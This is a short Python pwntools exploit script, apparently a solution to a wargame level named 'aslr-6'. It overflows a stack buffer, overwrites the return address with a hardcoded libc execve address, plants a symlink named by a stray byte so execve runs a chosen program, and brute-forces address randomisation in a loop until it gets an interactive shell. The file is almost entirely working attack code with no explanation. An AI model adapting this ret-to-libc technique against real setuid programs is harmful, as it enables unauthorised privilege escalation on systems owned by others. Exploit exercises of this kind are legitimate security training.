#!/usr/bin/env python

from pwn import *
import os

#p = process("./aslr-5")

# [buffer] [saved ebp]
buf = "A" * 0x88 + "BBBB"

"""
0xb7e227e0 <execve>
0xb7e515f0 <__setregid>

0xb7de97e0 <execve>
0xb7e185f0 <__setregid>
"""

execve = p32(0xb7e1c7e0)
setregid = p32(0xb7e185f0)

"""
0x0000082b : pop ebp ; ret
0x00000828 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x00000519 : pop ebx ; ret
0x0000082a : pop edi ; pop ebp ; ret
0x00000491 : pop es ; add byte ptr [eax], al ; add al, byte ptr [ecx] ; add byte ptr [eax], al ; ret
0x00000829 : pop esi ; pop edi ; pop ebp ; ret
"""

pop_pop_ret = p32(0x0000082a)

#buf += setregid
#buf += pop_pop_ret
#buf += p32(50412)
#buf += p32(50412)

# 0x4f5028
# 0x40301c
string = p32(0xb7e1c95a)
if os.path.exists("\004"):
    os.unlink("\004")

os.symlink("A", "\004");

buf += execve
buf += p32(0)
buf += string
buf += p32(0)
buf += p32(0)

i = 0
while True:
    p = process('./aslr-6')
    print('sending: ')
    print(buf)
    print(i)
    i=i+1
    p.sendline(buf)
    p.interactive()
    p.close()
